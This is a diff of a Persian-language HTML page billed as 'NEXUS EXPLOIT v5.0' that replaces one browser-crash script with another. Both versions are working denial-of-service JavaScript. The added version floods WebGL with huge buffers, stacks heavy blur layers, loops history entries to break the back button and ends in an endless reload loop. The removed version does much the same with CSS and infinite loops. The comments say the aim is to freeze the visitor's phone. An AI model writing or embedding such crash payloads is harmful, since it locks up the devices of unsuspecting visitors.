@@ -2,71 +2,78 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>NEXUS ULTIMATE CRASH TEST</title>
+    <title>NEXUS EXPLOIT v5.0 | REZA</title>
     <style>
-        body { background: #000; color: #00f2fe; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .btn-crash { 
-            background: linear-gradient(45deg, #ff0000, #990000); 
-            color: white; border: none; padding: 20px 40px; 
-            font-size: 20px; font-weight: bold; border-radius: 50px; 
-            cursor: pointer; box-shadow: 0 0 30px rgba(255,0,0,0.5);
-        }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .exploit-btn { background: #ff0000; color: #000; border: none; padding: 25px 50px; font-size: 24px; font-weight: 900; border-radius: 5px; cursor: pointer; box-shadow: 0 0 50px #ff0000; transition: 0.3s; }
+        .exploit-btn:hover { transform: scale(1.1); background: #fff; }
     </style>
 </head>
 <body>
 
-    <h1>تست نفوذ: کرش کلی اپلیکیشن</h1>
-    <p>این کد موتور رندرینگ (GPU) را هدف قرار می‌دهد.</p>
+    <h1 style="letter-spacing: 5px;">SYSTEM VULNERABILITY TEST</h1>
+    <p>Target: Browser Engine Compositor</p>
     
-    <button id="crashBtn" class="btn-crash">اجرای CRASH سنگین</button>
+    <button id="killBtn" class="exploit-btn">EXECUTE TOTAL CRASH</button>
+
+    <div id="status" style="margin-top: 20px; font-size: 12px; color: #555;">Status: Ready for Payload</div>
 
     <script>
-        document.getElementById('crashBtn').addEventListener('click', function() {
-            if(confirm("آیا برای کرش کامل اپلیکیشن آماده هستید؟")) {
-                startExploit();
-            }
-        });
-
-        function startExploit() {
-            // ۱. ایجاد نشت حافظه گرافیکی (Graphics Memory Leak)
-            // ایجاد هزاران المان با سایه و فیلترهای سنگین که GPU را قفل می‌کند
-            setInterval(() => {
-                for(let i = 0; i < 500; i++) {
-                    let div = document.createElement('div');
-                    div.style.cssText = `
-                        position: fixed;
-                        top: ${Math.random()*100}%;
-                        left: ${Math.random()*100}%;
-                        width: 100px; height: 100px;
-                        box-shadow: 0 0 100px 50px red;
-                        backdrop-filter: blur(50px);
-                        border-radius: 50%;
-                        z-index: ${i};
-                    `;
-                    document.body.appendChild(div);
-                }
-            }, 10);
-
-            // ۲. بمباران تاریخچه (History Bomb)
-            // این کار باعث می‌شود دکمه Back گوشی هم از کار بیفتد و مرورگر هنگ کند
-            setInterval(() => {
-                window.history.pushState(null, "", "?crash=" + Math.random());
-            }, 1);
-
-            // ۳. حلقه مرگ (Infinite Recursion & Processing)
-            // این بخش پردازنده را به ۱۰۰٪ می‌رساند تا سیستم‌عامل دستور بسته شدن برنامه را صادر کند
-            function crashLoop() {
-                let x = "REZA_CRASH".repeat(10000);
-                console.log(x);
-                // فراخوانی بازگشتی فوق سریع
-                setTimeout(crashLoop, 0);
-                while(true) {
-                    Math.sqrt(Math.random() * 999999);
-                }
-            }
+        document.getElementById('killBtn').onclick = function() {
+            document.getElementById('status').innerText = "Payload Injected. Overloading GPU...";
             
-            crashLoop();
-        }
+            // ۱. حمله به موتور گرافیکی (GPU Memory Overflow)
+            // این بخش باعث می‌شود کل سیستم‌عامل موبایل برای ثانیه‌ای فریز شود
+            function floodGPU() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                
+                // ایجاد بافرهای عظیم که GPU را مجبور به کرش می‌کند
+                setInterval(() => {
+                    const buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000000), gl.STATIC_DRAW);
+                    
+                    // ایجاد المان‌های سنگین CSS که موتور Compositor را قفل می‌کند
+                    const leak = document.createElement('div');
+                    leak.style.cssText = "width: 100vw; height: 100vh; backdrop-filter: blur(100px); mix-blend-mode: difference; position: fixed; top: 0;";
+                    document.body.appendChild(leak);
+                }, 1);
+            }
+
+            // ۲. نشت حافظه غیرقابل بازگشت (Heap Spraying)
+            // از رشته‌های تصادفی استفاده می‌کنیم تا مرورگر نتواند آن‌ها را فشرده کند
+            let vault = [];
+            function heapSpray() {
+                while(true) {
+                    let chunk = new Array(1000000).fill(Math.random()).join('---');
+                    vault.push(chunk);
+                    
+                    // ایجاد فشار روی تاریخچه برای از کار انداختن کلیدهای سیستمی گوشی
+                    window.history.pushState(null, "", "/" + Math.random());
+                    
+                    if (vault.length > 100) break; // انتقال به مرحله فریز
+                }
+            }
+
+            // ۳. اجرای همزمان (The Kill Switch)
+            try {
+                floodGPU();
+                heapSpray();
+                
+                // فریز کردن نهایی Main Thread
+                const crash = () => {
+                    console.log("CRASHING...");
+                    while(true) {
+                        location.reload(); // درخواست‌های مکرر ریلود همزمان با حلقه بی‌نهایت
+                    }
+                };
+                crash();
+            } catch(e) {
+                location.reload();
+            }
+        };
     </script>
 </body>
 </html>
